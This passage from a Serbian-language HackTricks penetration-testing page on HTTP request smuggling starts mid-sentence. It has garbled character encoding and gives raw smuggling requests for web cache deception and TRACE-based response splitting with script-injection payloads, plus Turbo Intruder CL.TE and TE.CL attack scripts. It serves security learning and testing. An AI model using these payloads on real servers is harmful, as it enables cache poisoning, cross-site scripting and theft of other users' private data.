Nakon toga, svaki zahtev za `/static/include.js` Ä‡e sluÅ¾iti keÅ¡irani sadrÅ¾aj napadaÄeve skripte, efikasno pokreÄ‡uÄ‡i Å¡irok XSS napad.

### KoriÅ¡Ä‡enje HTTP request smuggling-a za izvoÄ‘enje web cache deception <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Koja je razlika izmeÄ‘u web cache poisoning-a i web cache deception-a?**
>
> * U **web cache poisoning-u**, napadaÄ uzrokuje da aplikacija saÄuva neki zlonamerni sadrÅ¾aj u keÅ¡u, a ovaj sadrÅ¾aj se servira iz keÅ¡a drugim korisnicima aplikacije.
> * U **web cache deception-u**, napadaÄ uzrokuje da aplikacija saÄuva neki osetljiv sadrÅ¾aj koji pripada drugom korisniku u keÅ¡u, a napadaÄ zatim preuzima ovaj sadrÅ¾aj iz keÅ¡a.

NapadaÄ kreira smuggled zahtev koji preuzima osetljiv sadrÅ¾aj specifiÄan za korisnika. Razmotrite sledeÄ‡i primer:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Ako ovaj smugglovani zahtev otrova keÅ¡ unos namenjen za statiÄki sadrÅ¾aj (npr., `/someimage.png`), osetljivi podaci Å¾rtve sa `/private/messages` mogli bi biti keÅ¡irani pod unosom keÅ¡a statiÄkog sadrÅ¾aja. Kao rezultat, napadaÄ bi potencijalno mogao da povrati ove keÅ¡irane osetljive podatke.

### Zloupotreba TRACE putem HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**U ovom postu**](https://portswigger.net/research/trace-desync-attack) se sugeriÅ¡e da, ako server ima omoguÄ‡enu metodu TRACE, moÅ¾e biti moguÄ‡e zloupotrebiti je putem HTTP Request Smuggling. To je zato Å¡to Ä‡e ova metoda reflektovati bilo koji header poslat serveru kao deo tela odgovora. Na primer:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Ä†e poslati odgovor kao Å¡to je:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Primer kako iskoristiti ovo ponaÅ¡anje bio bi da se **prokrijumÄari prvo HEAD zahtev**. Ovaj zahtev Ä‡e biti odgovoreno samo sa **zaglavljima** GET zahteva (**`Content-Type`** meÄ‘u njima). I prokrijumÄariti **odmah nakon HEAD TRACE zahtev**, koji Ä‡e **odraÅ¾avati poslati podaci**.\
PoÅ¡to Ä‡e HEAD odgovor sadrÅ¾ati `Content-Length` zaglavlje, **odgovor TRACE zahteva Ä‡e biti tretiran kao telo HEAD odgovora, Å¡to Ä‡e stoga odraÅ¾avati proizvoljne podatke** u odgovoru.\
Ovaj odgovor Ä‡e biti poslat sledeÄ‡em zahtevu preko veze, tako da bi ovo moglo biti **iskoriÅ¡Ä‡eno u keÅ¡iranom JS fajlu na primer da se ubaci proizvoljan JS kod**.

### IskoriÅ¡Ä‡avanje TRACE putem HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Nastavite da pratite [**ovaj post**](https://portswigger.net/research/trace-desync-attack) koji sugeriÅ¡e joÅ¡ jedan naÄin da se iskoristi TRACE metoda. Kao Å¡to je komentarisano, prokrijumÄariti HEAD zahtev i TRACE zahtev je moguÄ‡e **kontrolisati neke odraÅ¾ene podatke** u odgovoru na HEAD zahtev. DuÅ¾ina tela HEAD zahteva je u suÅ¡tini naznaÄena u Content-Length zaglavlju i formira se odgovorom na TRACE zahtev.

Stoga, nova ideja bi bila da, znajuÄ‡i ovo Content-Length i podatke date u TRACE odgovoru, moguÄ‡e je uÄiniti da TRACE odgovor sadrÅ¾i validan HTTP odgovor nakon poslednjeg bajta Content-Length, omoguÄ‡avajuÄ‡i napadaÄu da potpuno kontroliÅ¡e zahtev za sledeÄ‡i odgovor (Å¡to bi moglo biti iskoriÅ¡Ä‡eno za izvoÄ‘enje trovanja keÅ¡a).

Primer:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
GenerisaÄ‡e ove odgovore (obratite paÅ¾nju na to kako HEAD odgovor ima Content-Length, Å¡to Äini da TRACE odgovor bude deo HEAD tela, a kada se zavrÅ¡i HEAD Content-Length, validan HTTP odgovor se Å¡vercuje):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(â€œarbitrary responseâ€)</script>
```
### Weaponizing HTTP Request Smuggling with HTTP Response Desynchronisation

Da li ste pronaÅ¡li neku HTTP Request Smuggling ranjivost i ne znate kako da je iskoristite. PokuÅ¡ajte ove druge metode eksploatacije:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### Other HTTP Request Smuggling Techniques

* Browser HTTP Request Smuggling (Client Side)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* Request Smuggling in HTTP/2 Downgrades

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Turbo intruder scripts

### CL.TE

Sa [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Alati

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Ovaj alat je HTTP Fuzzer zasnovan na gramatici koji je koristan za pronalaÅ¾enje Äudnih razlika u request smuggling-u.

## Reference

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
* [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¡ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
